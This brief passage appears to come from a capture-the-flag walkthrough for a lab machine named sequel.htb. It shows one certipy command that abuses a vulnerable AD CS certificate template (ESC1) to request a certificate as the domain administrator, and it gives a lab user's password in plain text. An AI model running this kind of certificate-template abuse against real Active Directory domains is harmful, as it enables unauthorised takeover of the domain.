...
```
certipy req -username Ryan.Cooper@sequel.htb -password NuclearMosquito3 -ca sequel-DC-CA -target ca.sequel.htb -template ESC1-Test -upn administrator@sequel.htb -dns dc.sequel.htb -debug
```
